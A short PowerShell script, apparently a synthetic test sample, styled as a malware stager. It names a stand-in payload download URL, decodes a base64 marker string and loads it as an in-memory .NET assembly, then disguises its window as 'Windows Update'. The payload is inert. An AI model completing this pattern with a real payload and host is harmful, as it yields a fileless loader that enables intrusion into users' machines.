
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://198.51.100.219/payload.bin',
    [int]$TimeoutSec = 38
)
$ErrorActionPreference = "Stop"

$ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp1cjc3YjhiczV0')
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$ResultObject = [Reflection.Assembly]::Load($ManagedBytes)
if ($null -ne $ResultObject) {
    Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$Host.UI.RawUI.WindowTitle = "Windows Update"
